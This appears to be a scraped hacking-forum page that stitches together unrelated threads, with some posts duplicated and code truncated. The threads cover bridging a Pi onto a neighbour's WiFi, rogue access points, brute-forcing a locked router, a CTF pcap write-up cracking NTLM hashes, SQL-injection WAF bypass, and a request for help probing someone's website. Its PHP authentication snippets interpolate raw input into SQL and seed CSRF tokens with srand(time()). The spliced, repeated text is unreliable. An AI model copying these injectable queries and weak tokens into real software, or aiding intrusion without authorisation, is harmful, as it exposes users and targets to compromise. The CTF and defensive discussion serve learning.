Quote by ArmorTaco  Sorry, haven't done ip forwarding in a while, so I'm likely forgetting something. If anybody knows where I went wrong, I would appreciate the help.   Your iptables command is fine though I would suggest to clear correctly before adding the rule.   Put this in firewall.sh then execute it :  Code  Iptables -F   iptables -X   iptables -t nat -F  iptables -t nat -A POSTROUTING -owlan1 -j MASQUERADE              .CodeMirror {height: auto;}      var element = document.getElementById("code-hmWZlPrcMQ");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });       You should add some rules later to secure your network.   All you have to do is to connect to your neighbour's network using wlan1. Don't forget to use the configuration that ArmorTaco gave you :  Quote by ArmorTaco  network={  ssid="wlan0 SSID"  psk="wlan0 Password"  key_mgmt=WPA-PSK  }   network={  ssid="Neighbor's SSID"  psk="Neighbor's Password"  key_mgmt=WPA-PSK  }   Now, maybe there is a routing issue inside your configuration.   If I understood well, your Pi, as a router, connects to your neighbour's network with wlan1 then forwards the connection through wlan0, which is your access point for your laptop, or at least this is what you want.   1) With the above configuration, once you are connected to your neighbour's AP, can you run 'route -n' on your Pi an give me the output ? Same thing with your laptop when you connect to your Pi wirelessly.   2) Can you also ping your neighbour's AP, then google from your Pi and your laptop and give me the results ?  3) Finally, please run iptables -L -v -n and give the results.
Thanks for the reply.   When you say "Put this in firewall.sh" what do you mean, exactly? Should I just run the commands you gave me?   And no, you've misunderstood a bit. I want to connect to my neighbor's WiFi with wlan1, and forward the connection to Ethernet, so I can connect the Ethernet cable to ANOTHER router. Basically wlan0 should not be taking any part in this.   And since wlan0 isn't goin to be taking part of this what is Code  network={  ssid="wlan0 SSID"  psk="wlan0 Password"  key_mgmt=WPA-PSK  }              .CodeMirror {height: auto;}      var element = document.getElementById("code-D1jI5FDU22");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        Going to be for?    I do understand this: Code  network={  ssid="Neighbor's SSID"  psk="Neighbor's Password"  key_mgmt=WPA-PSK  }              .CodeMirror {height: auto;}      var element = document.getElementById("code-FQQbeZ7ObU");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        But what about the first one? Since I am not going to be using wlan0, what exactly should I put in there..?
Quote by NullSecWhen you say "Put this in firewall.sh" what do you mean, exactly? Should I just run the commands you gave me?  Yes, run the commands, it's just that I find it easier to put your rules in a file, chmod +x the file, and run it instead of running each command every time.

ArmorTaco could answer to this, but I believe he thought that wlan0 was the network interface of your "another router" (let's call it routerNullSec), which is meant to be used as an AP for your latpop.   Let's illustrate this, it should be easier to fully understand this !     LAPTOP [wlanX] <---------> [wlanY] routerNullSec [ethZ] <---------> [ethW] Pi [wlan1] <------> neighbour's network   Can you please give me the correct interfaces in red (wlanX, wlanY, ethZ and ethW) and tell me if this is correct ?

gonna check it out tonight, thanks
when i try to open the hostpad-mana.conf file it says parsing error and shows a blank page 
Part of hacking is some self research, looks like you spent less than half an hour even trying with this.
i am not giving up, i am just posting the update on the topic, thanks for giving a good advice tho
Check out https://cyberarms.wordpress.com/2014/10/16/mana-tutorial-the-intelligent-rogue-wi-fi-router/
Already did look at that, hostapd-mana.conf still isn't showing anything. I'll try to find clone it from github and do manual installation
Are you attempting to social engineer the Network client(s) into inputing the WiFi's Password?

Wow, I actually had imagined this project a while ago, didn't know it existed!    I copied the BSSID of the network I'm currently connected on, pasted it in there, but didn't indicate any location... Any idea why?
Not part of the public database I guess.
Is this Database active only if users upload their BSSID's and Location to the Database? I thought there was some kind of decryption the site performed to BSSID values and it converts them to Geographic Coordinates that are indicated on the map..

Can you give us the exact model number?   Have you seen this?  https://blog.michaelfmcnamara.com/2008/05/factory-reset-motorola-ap-5131/         Edited by FullSpeed (Monday 15th of August 2016 03:35:48 PM)
You are correct. That is the model number AP-5131. I tried the serial port method and it does not work. I pressed ESC, when “Press escape key to run boot firmware” appears. I tried mashing the ESC key on power up, and that doesn't work. I tried 4 different PCs with this, with built in serial port, with USB-Serial, with Linux (minicom, putty), Windows XP (hyperterminal), Windows 7 (putty, hyperterminal). None of these are able to get the router to reset firmware. All have the same behaviour, would not take any keys, until after about 30 seconds. At that point, it is too late, the router already started the boot-up process. I even tried pressing, Ctrl+[ instead of ESC. Nothing works through the serial comm. I actually have 3 of these routers, and I tried this method on all of them. All the same behaviour.
What are your com port settings?   Think it would be unlikely that you can't connect in through a com port on 3 identical units.   Could all 3 units be bad, sure.                       Edited by Infinital (Monday 15th of August 2016 04:35:58 PM)
Quote by InfinitalWhat are your com port settings?   Think it would be unlikely that you can't connect in through a com port on 3 identical units.   Could all 3 units be bad, sure.   The comm port is set to 19200-8-N-1.    The settings should be correct considering I am able to see the boot up messages. I am able to type after about 30 seconds. From what I understand, the IT guy who originally set up these routers was very good at what he did, so my guess is that he somehow disabled key entry for a few seconds. This guy left the company without documenting the passwords. We can not contact the guy.    Here is a print out of the comm port of the router while booting up. You can see at the end that I am prompted for a user/pass (factory user/pass defaults do not work):    AP-5131 Boot Firmware Version 1.1.0.0-045R  Copyright(c) Symbol Technologies Inc. 2006.

I have already given up trying to do anything through the serial port. I am thinking the only method left over for me is trying a brute force on the router. As per my original post, using hydra, I can't do anything through ssh, or telnet. I can't seem to get any web form parameters through Burp Suite (I'm guessing because of the java applet). Anyone have any suggestions on how I should proceed? Any help would be greatly appreciated. Thank you.
Maybe try looking for vulnerabilities, since its an old router there might be a chance.    With something like this: https://github.com/reverse-shell/routersploit
Quote by FullSpeedMaybe try looking for vulnerabilities, since its an old router there might be a chance.    With something like this: https://github.com/reverse-shell/routersploit   That's a nice tool. I like it. Unfortunately, it did not find any. I thought for sure the Heartbleed would work, but it didn't. Unfortunately this Symbol router is not common. Do you know of any other good tools like that? Maybe with a larger list of exploits?
Can you give us the exact model number?   Have you seen this?  https://blog.michaelfmcnamara.com/2008/05/factory-reset-motorola-ap-5131/         Edited by FullSpeed (Monday 15th of August 2016 03:35:48 PM)
You are correct. That is the model number AP-5131. I tried the serial port method and it does not work. I pressed ESC, when “Press escape key to run boot firmware” appears. I tried mashing the ESC key on power up, and that doesn't work. I tried 4 different PCs with this, with built in serial port, with USB-Serial, with Linux (minicom, putty), Windows XP (hyperterminal), Windows 7 (putty, hyperterminal). None of these are able to get the router to reset firmware. All have the same behaviour, would not take any keys, until after about 30 seconds. At that point, it is too late, the router already started the boot-up process. I even tried pressing, Ctrl+[ instead of ESC. Nothing works through the serial comm. I actually have 3 of these routers, and I tried this method on all of them. All the same behaviour.
What are your com port settings?   Think it would be unlikely that you can't connect in through a com port on 3 identical units.   Could all 3 units be bad, sure.                       Edited by Infinital (Monday 15th of August 2016 04:35:58 PM)
Quote by InfinitalWhat are your com port settings?   Think it would be unlikely that you can't connect in through a com port on 3 identical units.   Could all 3 units be bad, sure.   The comm port is set to 19200-8-N-1.    The settings should be correct considering I am able to see the boot up messages. I am able to type after about 30 seconds. From what I understand, the IT guy who originally set up these routers was very good at what he did, so my guess is that he somehow disabled key entry for a few seconds. This guy left the company without documenting the passwords. We can not contact the guy.    Here is a print out of the comm port of the router while booting up. You can see at the end that I am prompted for a user/pass (factory user/pass defaults do not work):    AP-5131 Boot Firmware Version 1.1.0.0-045R  Copyright(c) Symbol Technologies Inc. 2006.

No, that is not what that means. WPS uses an 8 character numeric code processed in two clusters of four digits each and the final number of the second half is used as a checksum. So, effectively wps uses one four digit password and a three digit password, which completely ruins the security of the password, because an 8 digit password has 100,000,000 possibilities, while a separate four and three digit password only has 11000 possible combinations. So, if your router has the option to disable wps, do so, if not, then I would recommend either looking for a more secure router or checking if there is a dd-wrt firmware available for your router. Other than the vulnerability of wps, your network should be relatively secure, assuming, of course, that you have a secure password that most people wouldn't guess, and/or a dictionary or brute force attack won't be able to crack in a short period of time.

I do not expect to get points since IMO I used a tool and I believe OP wants us to be able to do it without using a calculator    Steps:   • Download Challenge PCAP File   • Google: pcap analyse   • Download Network Miner (free version)   • Open Network Miner, open PCAP.     Here you can get a visual on the IP addresses. You see the other tabs also have some goodies listed.   Here are our captured credentials:     Here we can see that there is a PDF file. However when you try to open using PDF viewer it says its corrupt.     So I changed the file extension from PDF to TXT and opened the file:  BINGO!     Lucky for me it says right there that its Base64 encoded. Else I would have been trying random decoders.   Google: Base64 decode   Paste in the code and press decode:    From there I went to HashKiller site and plugged in NTLM hashes. I was able to get the password for Win7x86H1 which is 'change'    Apologies for post formatting, I will of course try to clean it up. Kind of a hurried post, wanted to be first to answer.

I went into this thread and I wasn't expecting answers already,  so I got the conclusion spoiled    Yeah sure. I wasn't expecting such quick replies in the first place.      @Ektoplasm That's spot on. However you missed two things which I was expecting. First, Since the file shared was in "pdf" (A spoofing attempt) but it was rather a normal text file. In forensics we mention each and every irregularity and document each and every step. Second the SAM dump you obtained after decoding the base64 encoded file had another user named Win7x86H1 for which you didn't recover the password. Other than that I liked the way you presented things.   I give you +40 for this challenge.   @0E800 That's a cool way of approaching this challenge taking into account that this was your first challenge.    I give you +35 for this challenge.  Challenge Closed. But people are encouraged to attempt this challenge and give more ways to solve this (If any)

However when you try to open using PDF viewer it says its corrupt.     So I changed the file extension from PDF to TXT and opened the file:  BINGO!     Lucky for me it says right there that its Base64 encoded. Else I would have been trying random decoders.   Google: Base64 decode   Paste in the code and press decode:    From there I went to HashKiller site and plugged in NTLM hashes. I was able to get the password for Win7x86H1 which is 'change'    Apologies for post formatting, I will of course try to clean it up. Kind of a hurried post, wanted to be first to answer.    Edit:   Not as adept or informative as Ektoplasma, I learned a lot reading his post after I realized he beat me to it.           Edited by 0E800 (Wednesday 31st of August 2016 12:38:27 AM)
Could we do the next one through PM? We could have a deadline set, and then when everyones finished, we could each post the conclusions in the thread. I went into this thread and I wasn't expecting answers already,  so I got the conclusion spoiled
Quote by FullSpeedCould we do the next one through PM? We could have a deadline set, and then when everyones finished, we could each post the conclusions in the thread. I went into this thread and I wasn't expecting answers already,  so I got the conclusion spoiled    Yeah sure. I wasn't expecting such quick replies in the first place.      @Ektoplasm That's spot on. However you missed two things which I was expecting. First, Since the file shared was in "pdf" (A spoofing attempt) but it was rather a normal text file. In forensics we mention each and every irregularity and document each and every step. Second the SAM dump you obtained after decoding the base64 encoded file had another user named Win7x86H1 for which you didn't recover the password. Other than that I liked the way you presented things.   I give you +40 for this challenge.   @0E800 That's a cool way of approaching this challenge taking into account that this was your first challenge.    I give you +35 for this challenge.  Challenge Closed. But people are encouraged to attempt this challenge and give more ways to solve this (If any)
There is a lot of them online, you'll have to decide yourself which one you like better. Does it have to have a gui? For information gathering "Maltego" is pretty good (When it comes to gui tools). Other obvious ones come to mind: nmap, recon-ng etc.
Hi,   Maltego for example aggregates sources and runs api queries , i am asking about sources such :  www.threatminer.org and other sources that creates the data themselves.   Thanks!
One of the most straightforward ways of enumerating name servers (DNS enumeration) is to use the host command in linux.  here is an example output that you'd get.   root@root:~$ host -t ns google.com  google.com name server ns3.google.com.  google.com name server ns2.google.com.  google.com name server ns1.google.com.  google.com name server ns4.google.com.   for IPs you can simply google the IP associated with the url    OR if you wanna get fancy you can use dnsrecon to perform a dns zone transfer on a particular host which can give you not only the IP of the domain but also the IPs of all the servers, subdomains, and domains associated with it.  That only works if you know its vulnerable to a zone transfer.

This is fantastic, Thanks     Just another suggestion for section 1.5 Securing vulnerabilities.   The use of parameterised queries is one of, if the not the best way of preventing against SQLi. This way, data and command are sent separately - therefore is no way for the application to misinterpret user input as a part of the SQL query.

How To Bypass Mod Security During Sql Injection ?
Quote by CyberSniper007How To Bypass Mod Security During Sql Injection ?  Obfuscation; Basically just change your injection until it works (if it ever will).

Ande, this is an excellent tutorial. I have a question though. I've been trying to hack a particular website for a while now, and I cannot seem to find a single vulnerability on their website. There isn't a single dork (vulnerable URLs such as: "inurl:buy.php?id=") that I can find, rendering any SQL injection attack useless, at least from my understanding. It appears the particular website is using a 3-tier MVC (model, view, controller) architecture, which makes an SQLi attack more difficult. What do you usually look for next in a website if you can't find and vulnerabilities for SQLi attacks?    Also, I am a bit of a newbie on the hacking scene, if I send you the link- could you take a look at the site for me and tell me if you see any vulnerabilities? I'm pretty sure I'm overlooking a lot of little things.

Look at intercepting proxies i.e. Zed Attack Proxy (ZAP) or Burp suite. It is the main 'go to' tool in web applications hacking. As for resources, 'The web applications hackers handbook 2' is a very solid book which i'd definitely recommend.
I actually have the pdf of that book! Just haven't dove into it yet! Thanks for the info!

Bug bounties are just a license to hack, report and get paid for it without any threat of including the Feds if you follow the rules.  So in other words, learn to hack and write good reports then you are set. There is no special hacking techniques for bug bounties except the usual hacking techniques. You can actually be reckless with them and make a lot of noise which you don't normally do with steal hacking.   So, go learn some hacking boy.
As Kenjoe41 said - you're just getting permission to hack the target. There could be terms and conditions to it aswell, such as them telling you some info about the target, or them insisting on giving you no information.   To sum up,   hacking = hacking  bug bounty = hacking (with permission)   Everything boils down to learning hacking, there's no side category for doing bug bounties. if you go to http://mlt.press he has some good advice about bounty hunting on his blog.
Thanks for the input guys! Sounds like some fun is to be had to me!!!
I would also recommend case studies, e.g. hackerone.com often publicly discloses found vulnerabilities, browse through and learn from it

Sounds like a web application firewall could be blocking some of your requests.   You will need to do further testing to confirm wither or not a WAF has been deployed, and if it is you will have to research and experiment with ways to bypass it.  A tool called wafw00f can be used to help you identify any WAFs in use.

The difference is same as:   1. promoting/marketting a product yourself putting more and more hard work, reading, communicating, etc. thereby getting a good response and on the contrary simply pay $100 or more to twitter or Google or facebook or other people to do it for you.   2. Getting a blog, posting more and more articles and improve SEO yourself and finally show up at page 1 on Google or on the other hand you simply buy the article for $2 - $10 from freelancing sites and services like SEO marketting and later boast that you're awesome.   3. It is same as buying the CEH course from EC-Council and get all the study materials but rather than working hard on them and actually learning the material, you download CEH dumps and crack the exam, get >90% and say "I hackzz the w0rld b1tch3s."    I can go on but hope you got the idea.    Manually finding the vulnerabilities involves learning, understanding the architecture properly, and exploiting. It involves the fun, excitement, the fear of failure that it may not work, but again the palpitation inside your heart when you almost narrow it down to pwning a server. Automated tools take away all the fun part, it takes away the fun when you have all those cruel ideas that come to your mind when you get shell access using reverse_tcp, after working on it for more than a week maybe.   Automated tools are primarily used in big enterprises where time is a huge factor. But you can never be a real hacker/pentester if you use automated tools. Learn how they work, get to the core, reverse engineer, think how to make something better and then actually make it. It takes time but worth it.    Remember the world wants real hackers those can build it and support what the previous generations hackers have done, rather then some people who are puppets in the hands of automated tools.   Hope you got the idea.

Not exactly sure what or why you are doing it this way.   The PHP session engine is basically a wrapper for cookies. However the content of the cookie is just an identifier to a temp file on the server. There is never any data saved in the session sent to the browser. Meaning you don't really have to be carefull about the content you put in $_SESSION. You also don't need to put so much data into it.   What you would normally do is something like:   Pseudocode for login: Code: php  <?php    $username = 'Got this from FORM input';  $password = 'Got this from FORM input';    $result = query('SELECT * FROM users WHERE username=$username AND password=$password');    if($result was found) {      $_SESSION['userID'] = $result['ID'];  } else {      echo('Wrong username or password');  }    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-TNgg413k8O");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        Pseudocode for verifying user: Code: php  <?php    $user = NULL;  if(isset($_SESSION['userID'])) {      $user = query("SELECT * FROM users WHERE id=$_SESSION['userID']");  }    if($user) {      // Logged in  } else {      // Not logged in  }    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-aX5p8TGQNR");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        Pseudocode for logging out: Code: php  <?php    $_SESSION['userID'] = NULL;    // OR    unset($_SESSION['userID']);    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-VBKiCiylAC");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        This is the simplest way of doing it. I personally like using a token instead of using the user ID directly. This allows for more complex session handeling in the database.   There is a lot of additional parameters and options you can set for the session engine, but honestly in most cases you wont need it.   Would also recommend you OOP your code. Having some sort of structure that always loads the user at the beginning. In the case of EZ I am using an Auth class wrapper for everything related to the currently logged in user.   Check out the laravel framework. Looks a lot like the one I use on a daily basis. Or mine looks like laravel.  Depends on how you look at it.    You might not want to use user agent and or IP as verification. What if you change your browser? What if your browser updates itself? What if you get a new IP from your ISP every day? What if you live at two or more places with different IP's and or machines and or browsers?                       Edited by ande (Friday 2nd of September 2016 02:22:24 PM)
@ande   So after you have validated the users password with the hash in the database, you should be ok to use a class and store the users common data in some OOP format like you said? Then when validating you just check if that class has a user ID, if it does not then we do not approve that request?   The pseudo code code you used to validate the user, are you saying that you should store a token in the database when they login, match the user ID with a token and if it does then they are verified? Because what is the point in matching the user id stored in the session with the user id stored in the database, it will always be the same right?   The reason I added the use of the user agent, IP and password was to help protect against session hijacking. Say if someone steals the session ID cookie, if their IP or use agent changes it would ask for login again; I know the user agent can be faked but it is another layer of security someone has to get right.

The example I posted uses the user's ID as the identifier for which user is logged in, and thats totally okay. But if you use tokens instead, you can do some cool stuff like listing what sessions are registered on each user, their IP, their user agent, when they were last used and the option to kill sessions. But for basic stuff, just storing the user ID in $_SESSION is fine.   You will of course need to have tokens in their own table. Something like:  Code| id | user_id | token | reg_time | visit_time | ip | user_agent |            .CodeMirror {height: auto;}      var element = document.getElementById("code-vo4zgmqWc8");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        I guess using the IP is an okay option to protect against session hijacking, but like I said, it comes with a price. Personally I don't think it's necessary as long as all security is done correctly. In other words, no XSS.   Here is a simplified and modified version of my Auth class wrapper. It handles the currently logged in user stuff. Keep in mind that I also use a ORM to make accessing database objects easier (like User and Session). But you should get the general idea.  Code: php  <?php    class Auth {        /**       * Holds the currently logged in user       */      private static $user = NULL;        /**       * Holds the currently logged in user's session       */      private static $session = NULL;          // ---------------------------------------------------------------------------      /**       * Initializes the currenty logged in user.       *       * Run this at a stratigic place early in your code:       *       *    Auth::init();       *       */      public static function init() {          // By default we attempt to load a user from session          Auth::loadFromSession();      }          // ---------------------------------------------------------------------------      /**       * Attempts to load the currently logged in user from session       *       */      public static function loadFromSession() {          // Check that we have user session          if(!isset($_SESSION['user'])) {              return;          }            // Try to find a session          $session = Session::where([['token', '=', $_SESSION['user']]]);          if(!$session) {              return;          }            // Try to load a user by the session's user ID          $user = User::findPK($session->user_id);          if($user) {              Auth::$user = $user;              Auth::$session = $session;          }      }          // ---------------------------------------------------------------------------      /**       * Returns true if the user is logged in       *       */      public static function isUser() {          return Auth::$user instanceof User;      }          // ---------------------------------------------------------------------------      /**       * Returns true if the user is not logged in       *       */      public static function isGuest() {          return !Auth::isUser();      }          // ---------------------------------------------------------------------------      /**       * Attempt to log a user in with credentials.       * This will result in sessions being set on both client side and       * database side if successful.       *       */      public static function loginUsingCredentials($username, $password) {          // You will want to add hashing, salt and stuff like that here somewhere            // Attempt to fetch user from username and password          $user = User::where([[              'username' => $username,              'password' => $password          ]]);            if($user) {                // Woop woop, correct username and password.              // Create a new session for the user and set it with $_SESSION              $newSession = Misc::genRandomStr(100);              $userAgent = ((isset($_SERVER['HTTP_USER_AGENT']))?$_SERVER['HTTP_USER_AGENT']:'Unknown');              Session::create(                  'user_id' => $user->id,                  'token' => $newSession,                  'reg_time' => time(),                  'visit_time' => time(),                  'ip' => $_SERVER['REMOTE_ADDR'],                  'user_agent' => $userAgent,              );                $_SESSION['user'] = $newSession;                // Return the good news              return TRUE;            }            // Nope          return FALSE;      }          // ---------------------------------------------------------------------------      /**       * Loads a user with a given ID and stores it as the current user       *       * No database changes       *       */      public static function loginUsingID($id) {          $user = User::findPK($id);          if(!empty($user)) {              Auth::$user = $user;          }      }          // ---------------------------------------------------------------------------      /**       * Logout whatever user is the current user.       * This will delete the session for the user in the database       * and destroy the browser session.       *       */      public static function logout() {          if(Auth::isGuest()) {              return FALSE;          }            $session = Auth::$session;          $session->delete();          unset($_SESSION['user']);            return TRUE;      }          // ---------------------------------------------------------------------------      /**       * Sets the current user       *       */      public static function setUser($user) {          Auth::$user = $user;      }          // ---------------------------------------------------------------------------      /**       * Returns the current user       *       */      public static function getUser() {          return Auth::$user;      }      }    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-W4OhxbrUjj");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         Usage:   You always need to run the following somewhere. If you have structured you application correctly, this should be easy.  Code: php  <?php    Auth::init();    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-4gnfz8pVr6");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         This page is only accessable for members:  Code: php  <?php    if(Auth::isGuest()) {      die('Members only!');  }    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-XoEOAqQ2Gp");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         This page is only accessable for guests:  Code: php  <?php    if(Auth::isUser()) {      die('Guests only!');  }    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-BriP418FW7");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         This is how you access the currently logged in user's data  Code: php  <?php    $welcomeName = 'Guest';    if(Auth::isUser()) {      $welcomeName = Auth::getUser()->username;  }    echo('Welcome ' . $welcomeName . '!');    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-hIfYCf3hSR");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         This is how you login  Code: php  <?php    if(Auth::isGuest()) {      die('You are already logged in!');  }    Auth::loginUsingCredentials($username, $password);    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-gu6e06dbUE");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         This is how you login using user ID (for testing or impersonating etc)  Code: php  <?php    Auth::loginUsingID(1); // Probably admin ID    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-E1SjxvFKN4");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         This is how you logout  Code: php  <?php    if(Auth::isUser()) {      die('You are not logged in!');  }    Auth::logout();    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-FL14Q2ouRh");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         Keep CSRF and stuff in mind tho, this is not a part of this.

Thanks! This is really helpful.   Would you say that running the init function is acceptable to run inside a "loadAllScripts.php" file or at the top of every page where you need to authenticate the user.   Lastly, with CSRF... Does that just concern where the username and password come from, that you should check standard headers to verify the request is same origin and the CSRF token? I can't see anywhere else CSRF comes into place other than that?

I can't see anywhere else CSRF comes into place other than that?    The "loadAllScripts.php" file approach is pretty outdated. But yes, that would work.   Yes the CSRF part is to make sure the login request came from your site. You might or might not want to use a CSRF token for that. Depends on whether or not you want people to be able to login posting from other pages and scripts. On the logout you definitely want a CSRF token.    I have this CSRF class as well:  Code: php  <?php    /**   * Cross Site Request Forgery protection class.   *   */  class CSRF {        // ---------------------------------------------------------------------------      /**       * Singleton style initialize CSRF token       *       */      public static function init() {          // Check if session engine is started          if (session_status() == PHP_SESSION_NONE) {              throw new Exception('Configuration failure: PHP session engine not started!');          }            static $tokenInitialized = FALSE;          if($tokenInitialized == FALSE) {              // Set token if not set              if(!isset($_SESSION['token'])) {                  $_SESSION['token'] = CSRF::generateNewToken();              }              $tokenInitialized = TRUE;          }      }          // ---------------------------------------------------------------------------      /**       * Generates a random string of 100 characters for the CSRF token       *       */      private static function generateNewToken() {          srand(time());

         }          return $ret;      }          // ---------------------------------------------------------------------------      /**       * Validates CSRF token for POST requests       *       */      public static function validatePost() {          // Check that the POST 'token' input is set          if(!isset($_POST['token'])) {              return FALSE;

       For GET requests  Please keep in mind that tokens in GET requests leaks to remotely loaded resources! Never let a page load with the token still in the URL.  Code: html  <a href="index.php?page=logout&token=<?php print CSRF::getToken(); ?>">Logout</a>            .CodeMirror {height: auto;}      var element = document.getElementById("code-oqgwwPBypA");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/html",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });       Code: php  <?php    // Is logged in logic    if(CSRF::validateGet()) {      // Logout user and redirect  } else {      die('Token out of balance');  }    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-ZuNmiN337W");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });         I think this works pretty well. But I thnk I am going to change my CSRF class slightly in the near future.                       Edited by ande (Friday 2nd of September 2016 05:51:51 PM)
Basically then I should be including the code for the init function at the top of every page when needed and not bother with using a "loadAllScripts" file.   Do you think it is worth more using a single page application like EZ does rather than having multiple pages; then using a template engine to load the correct page for the user?   Thank you for your quick and quality responses!
I find the following posts as interesting:  http://blog.teamtreehouse.com/how-to-create-bulletproof-sessions http://eddmann.com/posts/securing-sessions-in-php/   and yes they have used similar techniques as well.

Not exactly sure what or why you are doing it this way.   The PHP session engine is basically a wrapper for cookies. However the content of the cookie is just an identifier to a temp file on the server. There is never any data saved in the session sent to the browser. Meaning you don't really have to be carefull about the content you put in $_SESSION. You also don't need to put so much data into it.   What you would normally do is something like:   Pseudocode for login: Code: php  <?php    $username = 'Got this from FORM input';  $password = 'Got this from FORM input';    $result = query('SELECT * FROM users WHERE username=$username AND password=$password');    if($result was found) {      $_SESSION['userID'] = $result['ID'];  } else {      echo('Wrong username or password');  }    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-XIjEGAtCYj");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        Pseudocode for verifying user: Code: php  <?php    $user = NULL;  if(isset($_SESSION['userID'])) {      $user = query("SELECT * FROM users WHERE id=$_SESSION['userID']");  }    if($user) {      // Logged in  } else {      // Not logged in  }    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-sqcOlcL2YR");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        Pseudocode for logging out: Code: php  <?php    $_SESSION['userID'] = NULL;    // OR    unset($_SESSION['userID']);    ?>            .CodeMirror {height: auto;}      var element = document.getElementById("code-leVZd65W84");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "application/x-httpd-php",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        This is the simplest way of doing it. I personally like using a token instead of using the user ID directly. This allows for more complex session handeling in the database.   There is a lot of additional parameters and options you can set for the session engine, but honestly in most cases you wont need it.   Would also recommend you OOP your code. Having some sort of structure that always loads the user at the beginning. In the case of EZ I am using an Auth class wrapper for everything related to the currently logged in user.   Check out the laravel framework. Looks a lot like the one I use on a daily basis. Or mine looks like laravel.  Depends on how you look at it.    You might not want to use user agent and or IP as verification. What if you 